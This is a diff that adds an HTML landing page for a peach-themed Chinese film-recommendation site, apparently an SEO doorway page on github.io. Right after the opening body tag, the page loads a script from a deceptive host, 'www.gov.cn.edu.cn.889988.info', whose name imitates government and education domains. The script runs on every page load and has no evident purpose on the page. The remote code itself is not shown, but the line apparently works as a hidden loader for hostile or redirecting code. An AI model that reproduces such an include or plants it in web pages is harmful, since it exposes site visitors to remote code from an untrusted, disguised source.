@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>桃子电影网 - 桃子色系片库精选与电影推荐 | taozidianyingwang-wap</title>
+<meta name="keywords" content="桃子电影网,桃子电影,taozidianyingwang,电影推荐,电影片库,高清电影,爱情电影,治愈系电影,电影分类">
+<meta name="description" content="桃子电影网(taozidianyingwang-wap)以甜美桃子色系呈现精选电影片库与观影推荐，覆盖爱情、治愈、青春、喜剧等类型，带你发现值得收藏的好电影。">
+<link rel="canonical" href="https://taozidianyingwang-wap.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--peach:#ffd9c7;--peach2:#ffb199;--coral:#ff6f91;--ink:#2d1b18;--mut:#8a6f6a;--bg:#fff7f3;--card:#fff;--line:#ffe0d4;--soft:#fff0ea}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Nunito","Microsoft YaHei","Helvetica Neue",sans-serif;background:var(--bg);color:var(--ink);line-height:1.8;-webkit-tap-highlight-color:transparent;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1160px;margin:0 auto;padding:0 22px}
+header{background:rgba(255,255,255,.85);backdrop-filter:blur(12px);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:99}
+.nav{display:flex;align-items:center;justify-content:space-between;height:76px;gap:20px}
+.logo{display:flex;align-items:center;gap:12px}
+.logo .mark{width:44px;height:44px;border-radius:14px;background:linear-gradient(140deg,var(--coral),var(--peach2));display:grid;place-items:center;font-size:22px;box-shadow:0 6px 16px rgba(255,111,145,.3)}
+.logo .nm{font-size:21px;font-weight:900;letter-spacing:-.3px}
+.logo .nm small{display:block;font-size:10px;font-weight:600;color:var(--mut);letter-spacing:1px;text-transform:uppercase}
+.menu-btn{display:none;width:46px;height:46px;border:1px solid var(--line);background:var(--soft);border-radius:14px;font-size:20px;cursor:pointer;color:var(--coral)}
+nav ul{display:flex;gap:4px;list-style:none}
+nav a{padding:10px 16px;border-radius:12px;font-size:14px;font-weight:700;color:var(--ink);transition:.2s}
+nav a:hover{background:var(--soft);color:var(--coral)}
+.btn{border:0;background:linear-gradient(120deg,var(--coral),var(--peach2));color:#fff;padding:12px 26px;border-radius:30px;font-weight:800;cursor:pointer;font-family:inherit;box-shadow:0 8px 22px rgba(255,111,145,.32)}
+.hero{padding:72px 0 80px;background:radial-gradient(circle at 85% 15%,var(--peach) 0,transparent 42%),radial-gradient(circle at 12% 88%,#ffe8dd 0,transparent 38%),var(--bg)}
+.hd{display:grid;grid-template-columns:1.05fr .95fr;gap:56px;align-items:center}
+.peach{font-size:12px;letter-spacing:2px;font-weight:800;color:var(--coral);text-transform:uppercase}
+h1{font-size:clamp(38px,5.8vw,60px);font-weight:900;line-height:1.16;letter-spacing:-1.5px;margin:16px 0 20px}
+h1 i{font-style:normal;background:linear-gradient(120deg,var(--coral),#ff9a72);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hd>.l{font-size:16px;color:var(--mut);max-width:500px}
+.cta{display:flex;gap:14px;margin-top:30px;flex-wrap:wrap}
+.cta .ghost{border:2px solid var(--line);background:transparent;color:var(--ink);padding:11px 24px;border-radius:30px;font-weight:800;cursor:pointer;font-family:inherit}
+.blob{position:relative;width:100%;aspect-ratio:1/1;max-width:420px;justify-self:end}
+.blob .seed{position:absolute;inset:0;border-radius:48% 52% 60% 40%/54% 46% 60% 40%;background:linear-gradient(160deg,var(--coral),var(--peach2));animation:wob 9s ease-in-out infinite;box-shadow:0 26px 60px rgba(255,111,145,.3)}
+.blob .seed:nth-child(2){inset:18px;background:var(--peach);animation-duration:12s;animation-direction:reverse;opacity:.9}
+.blob .seed:nth-child(3){inset:56px;background:#fff;border:2px dashed var(--coral);animation-duration:7s}
+@keyframes wob{0%,100%{border-radius:48% 52% 60% 40%/54% 46% 60% 40%}50%{border-radius:62% 38% 42% 58%/44% 60% 40% 56%}}
+.blob .txt{position:absolute;inset:0;display:grid;place-items:center;text-align:center}
+.blob .txt b{font-size:44px;font-weight:900;color:var(--coral);line-height:1.2}
+.blob .txt span{display:block;font-size:12px;letter-spacing:3px;color:var(--mut);font-weight:800}
+.tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:26px}
+.tags span{padding:6px 14px;background:var(--card);border:1px solid var(--line);border-radius:20px;font-size:13px;font-weight:600;color:var(--ink)}
+.tags span.s{color:var(--coral);border-color:var(--peach2)}
+section{padding:86px 0}
+.k{text-align:center;max-width:640px;margin:0 auto 46px}
+.k h2{font-size:32px;font-weight:900;margin:8px 0 12px;letter-spacing:-.5px}
+.k h2 em{font-style:normal;color:var(--coral)}
+.k p{color:var(--mut);font-size:15px}
+.taste{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.tc{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:26px;transition:.28s;position:relative;overflow:hidden}
+.tc::before{content:"";position:absolute;right:-26px;top:-26px;width:92px;height:92px;border-radius:50%;background:var(--soft)}
+.tc:hover{transform:translateY(-6px);box-shadow:0 18px 40px rgba(255,111,145,.14)}
+.tc .fl{font-size:30px;display:block;margin-bottom:12px}
+.tc h4{font-size:18px;font-weight:900;margin-bottom:8px}
+.tc p{font-size:14px;color:var(--mut);margin-bottom:16px}
+.tc .ln{display:inline-flex;align-items:center;gap:6px;font-size:13px;font-weight:800;color:var(--coral)}
+.tc .ct{font-size:11px;font-weight:800;color:var(--mut);position:absolute;right:20px;top:22px}
+.dual{background:var(--card);border:1px solid var(--line);border-radius:24px;padding:46px;overflow:hidden;position:relative}
+.dual::after{content:"";position:absolute;left:50%;top:0;bottom:0;width:1px;background:var(--line)}
+.du{display:grid;grid-template-columns:1fr 1fr;gap:52px;align-items:center;position:relative}
+.dual .e{font-size:11px;letter-spacing:3px;font-weight:800;color:var(--coral);text-transform:uppercase}
+.dual h2{font-size:30px;font-weight:900;margin:12px 0 18px;line-height:1.4}
+.dual p{color:var(--mut);font-size:15px;margin-bottom:20px}
+.dual ul{list-style:none;display:flex;flex-direction:column;gap:12px}
+.dual li{display:flex;align-items:flex-start;gap:12px;font-size:14.5px}
+.dual li::before{content:"🍑";font-size:15px;flex:none;margin-top:2px}
+.steps{display:flex;flex-direction:column;gap:0}
+.st{display:flex;gap:20px;padding:20px 0;border-bottom:1px solid var(--line)}
+.st:last-child{border-bottom:0}
+.st .n{width:40px;height:40px;flex:none;border-radius:13px;background:var(--soft);color:var(--coral);font-weight:900;font-size:15px;display:grid;place-items:center}
+.st b{font-size:16px;font-weight:800;display:block;margin-bottom:3px}
+.st span{font-size:13.5px;color:var(--mut)}
+.marq{background:var(--ink);border-radius:24px;padding:34px 0;overflow:hidden;position:relative}
+.marq .tr{display:flex;gap:44px;width:max-content;animation:mr 32s linear infinite}
+.marq .tr span{font-size:22px;font-weight:900;color:#fff;white-space:nowrap;display:inline-flex;align-items:center;gap:44px}
+.marq .tr span i{font-style:normal;color:var(--coral)}
+@keyframes mr{to{transform:translateX(-50%)}}
+.pick{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.pk{background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.25s}
+.pk:hover{transform:scale(1.03);box-shadow:0 14px 34px rgba(255,111,145,.18)}
+.pk .cv{height:130px;display:grid;place-items:center;font-size:40px;color:#fff;position:relative}
+.pk:nth-child(1) .cv{background:linear-gradient(140deg,#ff9a72,#ff6f91)}
+.pk:nth-child(2) .cv{background:linear-gradient(140deg,#ffb199,#ff8a5b)}
+.pk:nth-child(3) .cv{background:linear-gradient(140deg,#ff7eb3,#ff6f91)}
+.pk:nth-child(4) .cv{background:linear-gradient(140deg,#ffa07a,#ff7f50)}
+.pk .cv .yr{position:absolute;right:12px;top:10px;font-size:11px;font-weight:800;background:rgba(255,255,255,.28);padding:2px 9px;border-radius:10px}
+.pk .bd{padding:16px}
+.pk h5{font-size:15px;font-weight:800;margin-bottom:5px}
+.pk p{font-size:12.5px;color:var(--mut)}
+.pk .bt{display:flex;justify-content:space-between;align-items:center;margin-top:12px;padding-top:12px;border-top:1px solid var(--line);font-size:11px;font-weight:800;color:var(--coral)}
+.lead{background:linear-gradient(135deg,var(--coral),#ff8fa8);border-radius:24px;padding:44px;color:#fff;display:grid;grid-template-columns:1.6fr 1fr;gap:40px;align-items:center}
+.lead .e{font-size:11px;letter-spacing:3px;font-weight:800;text-transform:uppercase;opacity:.8}
+.lead h2{font-size:27px;font-weight:900;margin:12px 0 16px;line-height:1.4}
+.lead p{opacity:.92;font-size:14.5px}
+.lead .btn{background:#fff;color:var(--coral);margin-top:20px}
+.lead .st2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.lead .st2 div{background:rgba(255,255,255,.16);border-radius:14px;padding:18px}
+.lead .st2 b{display:block;font-size:24px;font-weight:900}
+.lead .st2 span{font-size:12px;opacity:.9}
+footer{background:var(--ink);color:#d9c4be;padding:64px 0 30px}
+.ft{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:40px;margin-bottom:44px}
+.ft .b .mark{width:42px;height:42px;border-radius:13px;background:linear-gradient(140deg,var(--coral),var(--peach2));display:grid;place-items:center;font-size:20px;margin-bottom:16px}
+.ft .b p{font-size:13.5px;max-width:330px;line-height:1.95;margin-top:0}
+.ft h5{font-size:13px;font-weight:800;color:#fff;margin-bottom:18px;letter-spacing:1px}
+.ft ul{list-style:none;display:flex;flex-direction:column;gap:11px;font-size:13px}
+.ft a:hover{color:var(--peach2)}
+.cp{text-align:center;font-size:12px;border-top:1px solid rgba(255,255,255,.1);padding-top:26px;color:#a98f89}
+.cp .u{color:#fff;font-weight:600}
+@media(max-width:940px){.hd{grid-template-columns:1fr}.blob{display:none}.dual,.lead{grid-template-columns:1fr;padding:34px}.du{grid-template-columns:1fr;gap:26px}.dual::after{display:none}.pick,.taste{grid-template-columns:1fr 1fr}section{padding:64px 0}}
+@media(max-width:680px){
+ .menu-btn{display:grid;place-items:center}
+ nav ul{display:none;position:absolute;top:76px;left:0;right:0;flex-direction:column;padding:14px;background:#fff;border-bottom:1px solid var(--line)}
+ nav ul.open{display:flex}
+ .taste,.pick{grid-template-columns:1fr}
+ .lead{padding:30px}.lead .st2{grid-template-columns:1fr}
+ .k h2{font-size:24px}
+ .ft{grid-template-columns:1fr 1fr;gap:28px}
+ .marq .tr span{font-size:17px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+<header>
+  <div class="wrap nav">
+    <div class="logo"><span class="mark">🍑</span><span class="nm">桃子电影网<small>Taozi Film</small></span></div>
+    <button class="menu-btn" id="mb">☰</button>
+    <nav><ul id="mu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#taste">口味分类</a></li>
+      <li><a href="#guide">选片指南</a></li>
+      <li><a href="#pick">本月精选</a></li>
+      <li><a href="#sub">订阅</a></li>
+    </ul></nav>
+  </div>
+</header>
+<main>
+  <section id="home" class="hero">
+    <div class="wrap hd">
+      <div>
+        <div class="peach">Peach · Picked Films</div>
+        <h1>挑一部<br>像 <i>桃子</i> 一样甜的</h1>
+        <p class="l">桃子电影网收录爱情、治愈、青春、喜剧等温暖系电影，用桃子色系呈现精选片库，帮你找到当下最对胃口的那一部。</p>
+        <div class="cta"><button class="btn" onclick="location.href='#pick'">开始选片 #</button><button class="ghost" onclick="location.href='#guide'">选片指南 #</button></div>
+        <div class="tags"><span class="s">爱情电影</span><span>治愈系电影</span><span>青春电影</span><span>喜剧电影</span><span>动画电影</span></div>
+      </div>
+      <div class="blob"><div class="seed"></div><div class="seed"></div><div class="seed"></div><div class="txt"><span>收录精选</span><b>1200+</b><span>部温暖好片</span></div></div>
+    </div>
+  </section>
+
+  <section id="taste">
+    <div class="wrap">
+      <div class="k"><div class="peach">By Taste</div><h2>按 <em>口味</em> 挑电影</h2><p>不想纠结类型标签？试试按心情和口味选片，桃子电影网把电影重新分成 6 种观影口味。</p></div>
+      <div class="taste">
+        <article class="tc"><span class="ct">218 部</span><span class="fl">💗</span><h4>甜甜的爱情</h4><p>心动、暧昧、相守，每一部都甜到心里去，适合一个人或两个人一起看。</p><span class="ln">查看片单 →</span></article>
+        <article class="tc"><span class="ct">176 部</span><span class="fl">🌿</span><h4>治愈系日常</h4><p>节奏舒缓、情绪温柔，看完会觉得生活还有光，适合疲惫时充电。</p><span class="ln">查看片单 →</span></article>
+        <article class="tc"><span class="ct">152 部</span><span class="fl">🎓</span><h4>青春与成长</h4><p>关于校园、友情和初恋，重温那些再也回不去的夏天。</p><span class="ln">查看片单 →</span></article>
+        <article class="tc"><span class="ct">204 部</span><span class="fl">😂</span><h4>轻松喜剧</h4><p>不需要思考，只需要笑，周末解压首选的轻松好片。</p><span class="ln">查看片单 →</span></article>
+        <article class="tc"><span class="ct">128 部</span><span class="fl">✨</span><h4>奇幻与童话</h4><p>色彩斑斓的想象世界，适合和小朋友或内心的孩子一起看。</p><span class="ln">查看片单 →</span></article>
+        <article class="tc"><span class="ct">94 部</span><span class="fl">🌙</span><h4>深夜独处</h4><p>安静、细腻、带一点忧伤，适合一个人深夜慢慢看的作品。</p><span class="ln">查看片单 →</span></article>
+      </div>
+    </div>
+  </section>
+
+  <section id="guide" style="background:#fff7f3">
+    <div class="wrap">
+      <div class="dual">
+        <div class="du">
+          <div>
+            <div class="e">How to Pick</div>
+            <h2>三步找到<br>今天想看的</h2>
+            <p>桃子电影网的选片方法：先确定心情，再锁定时长，最后看一眼评分，三步之内就能下单今晚的观影清单。</p>
+            <ul><li>按心情选口味，不纠结类型标签</li><li>按时长筛片，短时爽快、长片沉浸</li><li>按评分兜底，避开烂片不踩雷</li></ul>
+          </div>
+          <div class="steps">
+            <div class="st"><span class="n">1</span><div><b>选一个心情</b><span>开心 / 疲惫 / 想念 / 无聊，告诉自己今天想要什么情绪。</span></div></div>
+            <div class="st"><span class="n">2</span><div><b>定一个时长</b><span>90 分钟轻快，120 分钟以上适合周末慢慢看。</span></div></div>
+            <div class="st"><span class="n">3</span><div><b>看一眼评分</b><span>8.0 分以上优先，再用短评确认是否合口味。</span></div></div>
+            <div class="st"><span class="n">4</span><div><b>收藏进清单</b><span>没看完的好片收进清单，下次直接续上。</span></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="pick" style="background:#fff;border-top:1px solid var(--line);border-bottom:1px solid var(--line)">
+    <div class="wrap">
+      <div class="k"><div class="peach">This Month</div><h2>本月 <em>精选</em> 四部</h2><p>编辑部每月从片库里挑出四部最值得看的温暖好片，涵盖爱情、治愈、喜剧与动画。</p></div>
+      <div class="pick">
+        <article class="pk"><div class="cv">💗<span class="yr">2024</span></div><div class="bd"><h5>关于爱情的那些事</h5><p>都市男女的暧昧与心动，甜度刚刚好</p><div class="bt"><span>爱情 · 8.6</span><span>查看 #</span></div></div></article>
+        <article class="pk"><div class="cv">🌿<span class="yr">2023</span></div><div class="bd"><h5>海边的咖啡馆</h5><p>慢节奏治愈系，看完想立刻出门旅行</p><div class="bt"><span>治愈 · 8.3</span><span>查看 #</span></div></div></article>
+        <article class="pk"><div class="cv">🎓<span class="yr">2025</span></div><div class="bd"><h5>毕业季的夏天</h5><p>青春友情与告别，重温回不去的夏天</p><div class="bt"><span>青春 · 8.1</span><span>查看 #</span></div></div></article>
+        <article class="pk"><div class="cv">😂<span class="yr">2026</span></div><div class="bd"><h5>周末解压指南</h5><p>全程笑点密集，不需要带脑子的快乐</p><div class="bt"><span>喜剧 · 7.9</span><span>查看 #</span></div></div></article>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <div class="wrap">
+      <div class="marq"><div class="tr"><span><i>🍑</i> 桃子电影网 · 温暖系片库精选 <i>🍑</i> 爱情电影 · 治愈系电影 · 青春电影 · 喜剧电影 <i>🍑</i> 1200+ 部精选好片 <i>🍑</i> taozidianyingwang-wap</span><span><i>🍑</i> 桃子电影网 · 温暖系片库精选 <i>🍑</i> 爱情电影 · 治愈系电影 · 青春电影 · 喜剧电影 <i>🍑</i> 1200+ 部精选好片 <i>🍑</i> taozidianyingwang-wap</span></div></div>
+    </div>
+  </section>
+
+  <section id="sub">
+    <div class="wrap">
+      <div class="lead">
+        <div>
+          <div class="e">Stay Sweet</div>
+          <h2>每周一封片单，<br>甜度刚好</h2>
+          <p>桃子电影网每周推送一份精选片单，按心情分类，附上短评与观看建议，让你再也不用纠结今晚看什么。</p>
+          <button class="btn">立即订阅 #</button>
+        </div>
+        <div class="st2"><div><b>1200+</b><span>收录好片</span></div><div><b>6</b><span>口味分类</span></div></div>
+      </div>
+    </div>
+  </section>
+</main>
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div class="b"><div class="mark">🍑</div><p>桃子电影网(taozidianyingwang-wap)以甜美桃子色系呈现精选电影片库与观影推荐，覆盖爱情、治愈、青春、喜剧等温暖系类型，帮你发现值得收藏的好电影。</p></div>
+      <div><h5>口味分类</h5><ul><li><a href="#">爱情电影</a></li><li><a href="#">治愈系电影</a></li><li><a href="#">青春电影</a></li><li><a href="#">喜剧电影</a></li></ul></div>
+      <div><h5>精选片单</h5><ul><li><a href="#">本月精选</a></li><li><a href="#">高分榜单</a></li><li><a href="#">最新上映</a></li><li><a href="#">经典回顾</a></li></ul></div>
+      <div><h5>关于本站</h5><ul><li><a href="#">关于桃子电影网</a></li><li><a href="#">投稿合作</a></li><li><a href="#">隐私条款</a></li><li><a href="#">联系我们</a></li></ul></div>
+    </div>
+    <div class="cp">
+      <p>网址：<span class="u">https://taozidianyingwang-wap.github.io</span></p>
+      <p style="margin-top:8px">关键词：桃子电影网、桃子电影、taozidianyingwang、电影推荐、电影片库、高清电影、爱情电影、治愈系电影</p>
+      <p style="margin-top:12px">© <span id="yr"></span> 桃子电影网 保留所有权利</p>
+    </div>
+  </div>
+</footer>
+<script>
+document.getElementById('yr').textContent=new Date().getFullYear();
+document.getElementById('mb').addEventListener('click',function(){document.getElementById('mu').classList.toggle('open')});
+document.querySelectorAll('#mu a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('mu').classList.remove('open')})});
+</script>
+</body>
+</html>
